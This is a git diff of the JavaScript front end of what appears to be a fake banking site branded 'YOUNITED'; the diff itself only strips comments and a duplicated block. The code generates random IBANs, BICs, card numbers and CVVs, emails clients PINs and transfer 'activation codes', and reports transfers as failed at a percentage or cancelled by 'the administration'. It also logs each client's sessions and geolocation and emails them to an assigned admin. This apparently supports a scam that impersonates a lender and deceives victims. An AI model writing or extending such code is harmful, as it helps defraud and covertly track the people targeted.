@@ -9,7 +9,6 @@ import {
 } from 'https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js';
 import { firebaseConfig } from './firebase-config.js';
 
-// ===== MODIF : Autoriser le zoom (pinch-to-zoom) partout dans l'application =====
 (function allowZoom() {
   try {
     var vp = document.querySelector('meta[name="viewport"]');
@@ -78,8 +77,6 @@ async function sendEmail({ to, name, subject, html, text, attachment }) {
     const att = { filename: attachment.filename, content: attachment.content, encoding: 'base64', contentType: 'application/pdf', type: 'application/pdf', mimeType: 'application/pdf' };
     body.attachment = att; body.attachments = [att]; body.pieceJointe = att; body.pieceJointePdf = att;
   }
-
-  // Tentative 1 : proxy Vercel sécurisé
   try {
     const res = await fetch('https://new-app-three-eta.vercel.app/api/send-email', {
       method: 'POST',
@@ -95,8 +92,6 @@ async function sendEmail({ to, name, subject, html, text, attachment }) {
   } catch (e) {
     console.error('[sendEmail] Erreur Vercel:', e);
   }
-
-  // Tentative 2 (secours) : appel direct à l'API Render
   try {
     const res2 = await fetch('https://getzenpay-email-api.onrender.com/api/send-welcome', {
       method: 'POST',
@@ -194,7 +189,6 @@ async function fetchClientGeoLocation() {
   return null;
 }
 
-// ===== MODIF : trackClientSession — Push admin SUPPRIMÉ =====
 async function trackClientSession(clientId, isOnline) {
   if (!clientId) return;
   try {
@@ -235,7 +229,6 @@ async function trackClientSession(clientId, isOnline) {
       }
       try { await FireDB.updateClient(clientId, geoUpdate); } catch (e) { console.error('[trackSession] Erreur géo:', e); }
 
-      // Envoi de l'email de notification à l'admin
       try {
         var freshClient = await FireDB.getClient(clientId);
         if (freshClient && freshClient.adminEmail) {
@@ -304,6 +297,7 @@ async function unregisterConnectedDevice(clientId) {
     } catch (e) { console.error('[unregisterConnectedDevice]', e); }
   })();
 }
+
 const emailTexts = {
   fr: { logoText: 'YOUNITED', welcomeSubject: 'Vos identifiants de connexion - YOUNITED', welcomeGreeting: 'Cher(e)', welcomeIntro: 'Nous avons le plaisir de vous confirmer l\'ouverture de votre compte chez YOUNITED.', welcomeThanks: 'Nous vous remercions de votre confiance et sommes ravis de pouvoir vous accompagner.', welcomeAccess: 'Afin d\'accéder à votre espace client en ligne, voici vos identifiants de connexion :', welcomeIdentifier: 'Identifiant', welcomePin: 'Code PIN', welcomeButton: 'Accéder à mon compte', welcomeSignature: 'Sincères salutations.', activationSubject: 'Code d\'activation de votre ordre de transfert - YOUNITED', activationIntro: 'Le code d\'activation de votre ordre de transfert est :', receiptSubject: 'Confirmation de virement - YOUNITED', receiptFailedSubject: 'Virement échoué - YOUNITED', receiptCancelSubject: 'Virement annulé - YOUNITED', receiptTitle: 'Confirmation de virement', receiptFailedTitle: 'Virement échoué', receiptCancelTitle: 'Virement annulé', receiptAmount: 'Montant', receiptBeneficiary: 'Bénéficiaire', receiptIban: 'IBAN / Numéro de compte', receiptBank: 'Banque', receiptSwift: 'Code SWIFT / BIC', receiptDate: 'Date', receiptStatus: 'Statut', receiptStatusDone: 'Effectué', receiptStatusFailed: 'Échoué à {percent}%', receiptStatusCancelled: 'Annulé', receiptReason: 'Motif', receiptReference: 'Référence', receiptSuccessIntro: 'Votre virement a été effectué avec succès.', receiptFailedIntro: 'Votre virement n\'a pas pu être finalisé. Il a échoué à {percent}% du processus. Aucun montant n\'a été débité de votre compte.', receiptCancelledIntro: 'Votre virement a été annulé par l\'administration. Le montant sera restitué sur votre compte.', disclaimerTitle: 'Clause de non-responsabilité :', disclaimer: 'Les informations contenues dans ce courriel et dans tous les fichiers transmis avec lui sont destinées uniquement au destinataire et peuvent contenir des éléments confidentiels ou privilégiés.',
     pendingTransferEmailSubject: 'Virement en attente de validation - YOUNITED', pendingTransferEmailTitle: 'Virement en attente', pendingTransferEmailIntro: 'Votre virement a bien été enregistré et est en attente de validation par le service administratif.', pendingTransferEmailBody: 'Notre service administratif va procéder à la vérification de votre ordre de virement. Vous recevrez une nouvelle notification dès que celui-ci aura été validé ou annulé.', pendingTransferEmailFooter: 'Le montant a été débité de votre compte. Il sera automatiquement restitué en cas d\'annulation par le service administratif.',
@@ -588,116 +582,6 @@ window.showConfirm = function(message, onConfirm, title, type) {
   document.getElementById('notif-confirm-btn').onclick = () => { ov.remove(); if (onConfirm) onConfirm(); };
   ov.addEventListener('click', (e) => { if (e.target === ov) ov.remove(); });
 };
-
-// ============ OPTIM : Cache client augmenté + cache liste clients ============
-const __clientCache = new Map();
-const __clientCacheTime = new Map();
-const __CLIENT_CACHE_TTL = 60000; // 60s au lieu de 5s
-
-const __myClientsCache = {};
-const __myClientsCacheTime = {};
-const __MY_CLIENTS_TTL = 30000; // 30s
-
-function __invalidateClientCache(id) {
-  if (!id) { __clientCache.clear(); __clientCacheTime.clear(); return; }
-  __clientCache.delete(id);
-  __clientCacheTime.delete(id);
-}
-function __invalidateMyClientsCache(adminUid) {
-  if (adminUid) { delete __myClientsCache[adminUid]; delete __myClientsCacheTime[adminUid]; }
-  else { Object.keys(__myClientsCache).forEach(function (k) { delete __myClientsCache[k]; delete __myClientsCacheTime[k]; }); }
-}
-
-const FireDB = {
-  async getClient(id) { 
-    try { 
-      const now = Date.now();
-      const cached = __clientCache.get(id);
-      if (cached && (now - (__clientCacheTime.get(id) || 0)) < __CLIENT_CACHE_TTL) return cached;
-      const s = await getDoc(doc(db, 'clients', id)); 
-      const result = s.exists() ? { id, ...s.data() } : null;
-      if (result) { __clientCache.set(id, result); __clientCacheTime.set(id, now); }
-      return result;
-    } catch (e) { return null; } 
-  },
-  async getMyClients(adminUid) {
-    const now = Date.now();
-    if (__myClientsCache[adminUid] && (now - (__myClientsCacheTime[adminUid] || 0)) < __MY_CLIENTS_TTL) {
-      return __myClientsCache[adminUid];
-    }
-    try {
-      const q = query(collection(db, 'clients'), where('adminUid', '==', adminUid));
-      const s = await getDocs(q);
-      const r = {};
-      s.forEach(d => { r[d.id] = { id: d.id, ...d.data() }; });
-      __myClientsCache[adminUid] = r;
-      __myClientsCacheTime[adminUid] = now;
-      return r;
-    } catch (e) { return {}; }
-  },
-  async createClient(id, data) { try { await setDoc(doc(db, 'clients', id), { ...data, createdAt: serverTimestamp() }); __invalidateClientCache(id); __invalidateMyClientsCache(); return true; } catch (e) { return false; } },
-  async updateClient(id, data) {
-    try {
-      await setDoc(doc(db, 'clients', id), { ...data, updatedAt: serverTimestamp() }, { merge: true });
-      __invalidateClientCache(id);
-      return true;
-    } catch (e) {
-      console.error('[FireDB.updateClient]', id, e);
-      return false;
-    }
-  },
-  async deleteClient(id) { try { await deleteDoc(doc(db, 'clients', id)); __invalidateClientCache(id); __invalidateMyClientsCache(); return true; } catch (e) { return false; } }
-};
-
-const ClientSession = { getActive: () => localStorage.getItem('tw_active_client'), setActive: (id) => localStorage.setItem('tw_active_client', id), clear: () => localStorage.removeItem('tw_active_client') };
-
-const CURRENCY_NAMES = { '€': 'EURO', '$': 'USD', '£': 'GBP', 'zł': 'PLN' };
-const CURRENCY_CODES = { '€': 'EUR', '$': 'USD', '£': 'GBP', 'zł': 'PLN' };
-function getCurrencyName(symbol) { return CURRENCY_NAMES[symbol] || 'EURO'; }
-function getCurrencyCode(symbol) { return CURRENCY_CODES[symbol] || symbol; }
-
-function generateIban(country) { const prefixMap = { 'France': 'FR', 'Pologne': 'PL', 'Espagne': 'ES', 'Italie': 'IT', 'Allemagne': 'DE' }; const prefix = prefixMap[country] || 'FR'; const len = { FR: 25, PL: 24, ES: 22, IT: 25, DE: 20 }[prefix] || 22; let body = ''; for (let i = 0; i < len; i++) body += Math.floor(Math.random() * 10); return prefix + body; }
-function generateBic(country) { const cc = { 'France': 'FR', 'Pologne': 'PL', 'Espagne': 'ES', 'Italie': 'IT', 'Allemagne': 'DE' }[country] || 'FR'; const L = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; let b = ''; for (let i = 0; i < 4; i++) b += L.charAt(Math.floor(Math.random() * L.length)); let l = ''; for (let i = 0; i < 2; i++) l += A.charAt(Math.floor(Math.random() * A.length)); return b + cc + l; }
-function generateCardNumber() { let n = '4'; for (let i = 0; i < 15; i++) n += Math.floor(Math.random() * 10); return n; }
-function generateCardExpiry() { return String(Math.floor(Math.random() * 12) + 1).padStart(2, '0') + '/' + String(Math.floor(Math.random() * 5) + 26); }
-function generateCardCvv() { return String(Math.floor(Math.random() * 900) + 100); }
-function getCardHolderName(client) { if (!client) return ''; if (client.cardHolder && client.cardHolder.trim()) return client.cardHolder.trim().toUpperCase(); return ((client.firstName || '') + ' ' + (client.lastName || '')).trim().toUpperCase(); }
-function formatIban(iban) { return iban ? iban.replace(/(.{4})/g, '$1 ').trim() : ''; }
-function formatCardNumber(num) { return num ? num.replace(/(.{4})/g, '$1 ').trim() : ''; }
-function maskIban(iban) { return (iban && iban.length >= 4) ? iban.slice(0, -4) + '••••' : iban; }
-function maskCardNumber(num) { return (num && num.length >= 4) ? num.slice(0, -4) + 'XXXX' : num; }
-function parseAmount(str) { if (!str) return 0; return parseFloat(String(str).replace(/[^\d.,-]/g, '').replace(/\s/g, '').replace(',', '.')) || 0; }
-
-function hexToHue(hex) { try { const n = parseInt(hex.replace('#', ''), 16); const r = ((n >> 16) & 255) / 255, g = ((n >> 8) & 255) / 255, b = (n & 255) / 255; const max = Math.max(r, g, b), min = Math.min(r, g, b); let h = 0; if (max !== min) { if (max === r) h = ((g - b) / (max - min)) % 6; else if (max === g) h = (b - r) / (max - min) + 2; else h = (r - g) / (max - min) + 4; } h = Math.round(h * 60); if (h < 0) h += 360; return h; } catch (e) { return 210; } }
-function applyBubbleColors(themeHex) { const themeHue = hexToHue(themeHex || '#1a73e8'); const h1 = (themeHue + 115) % 360, h2 = (themeHue + 235) % 360, h3 = (themeHue + 305) % 360; const root = document.documentElement; root.style.setProperty('--bubble-c1', 'hsla(' + h1 + ', 95%, 62%, 0.95)'); root.style.setProperty('--bubble-c2', 'hsla(' + h2 + ', 95%, 58%, 0.85)'); root.style.setProperty('--bubble-c3', 'hsla(' + h3 + ', 98%, 65%, 0.75)'); root.style.setProperty('--bubble-c1-soft', 'hsla(' + h1 + ', 100%, 55%, 0.15)'); root.style.setProperty('--bubble-c2-soft', 'hsla(' + h2 + ', 100%, 55%, 0.15)'); root.style.setProperty('--bubble-c3-soft', 'hsla(' + h3 + ', 100%, 55%, 0.15)'); }
-
-const lighten = (hex, amount) => { try { const n = parseInt(hex.replace('#', ''), 16); const r = Math.min(255, Math.round(((n >> 16) & 255) + (255 - ((n >> 16) & 255)) * amount)); const g = Math.min(255, Math.round(((n >> 8) & 255) + (255 - ((n >> 8) & 255)) * amount)); const b = Math.min(255, Math.round((n & 255) + (255 - (n & 255)) * amount)); return '#' + ((r << 16) | (g << 8) | b).toString(16).padStart(6, '0'); } catch (e) { return '#e8f0fe'; } };
-const darken = (hex, pct) => { const n = parseInt(hex.replace('#', ''), 16); const r = Math.max(0, ((n >> 16) & 255) - pct); const g = Math.max(0, ((n >> 8) & 255) - pct); const b = Math.max(0, (n & 255) - pct); return '#' + ((r << 16) | (g << 8) | b).toString(16).padStart(6, '0'); };
-
-const applyTheme = (color) => { color = color || '#1a73e8'; const n = parseInt(color.replace('#', ''), 16); const r = (n >> 16) & 255, g = (n >> 8) & 255, b = n & 255; document.documentElement.style.setProperty('--primary', color); document.documentElement.style.setProperty('--primary-dark', darken(color, 40)); document.documentElement.style.setProperty('--primary-light', lighten(color, 0.9)); document.documentElement.style.setProperty('--primary-soft', lighten(color, 0.75)); document.documentElement.style.setProperty('--primary-r', String(r)); document.documentElement.style.setProperty('--primary-g', String(g)); document.documentElement.style.setProperty('--primary-b', String(b)); applyBubbleColors(color); };
-
-let isHandlingPop = false;
-function pushHistory(s) { if (isHandlingPop) return; try { history.pushState({ tw: true, screen: s }, '', '#' + s); } catch (e) {} }
-function replaceHistory(s) { try { history.replaceState({ tw: true, screen: s }, '', '#' + s); } catch (e) {} }
-function replaceLoginHistory() { try { history.replaceState({ tw: true, screen: 'login' }, '', '#login'); } catch (e) {} }
-
-window.addEventListener('popstate', async (event) => {
-  const state = event.state;
-  if (!state || !state.tw) return;
-  isHandlingPop = true;
-  if (state.screen === 'login') { ClientSession.clear(); if (clientUnsubscribe) { try { clientUnsubscribe(); } catch (e) {} clientUnsubscribe = null; } initClient(); setTimeout(() => { isHandlingPop = false; }, 150); return; }
-  const target = document.getElementById(state.screen);
-  if (target) {
-    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active')); target.classList.add('active');
-    document.querySelectorAll('.nav-item-new').forEach(i => i.classList.remove('active'));
-    const map = { 'screen-dashboard': 'nav-dashboard', 'screen-card': 'nav-card', 'screen-profile': 'nav-profile' };
-    let navId = map[state.screen];
-    if (['screen-transfer', 'screen-verification', 'screen-processing', 'screen-result'].indexOf(state.screen) !== -1) navId = 'nav-transfer';
-    if (navId) { const n = document.getElementById(navId); if (n) n.classList.add('active'); }
-    const container = document.querySelector('.screens-container'); if (container) container.scrollTop = 0;
-  }
-  setTimeout(() => { isHandlingPop = false; }, 150);
-});
 // ============ OPTIM : Cache client augmenté + cache liste clients ============
 const __clientCache = new Map();
 const __clientCacheTime = new Map();
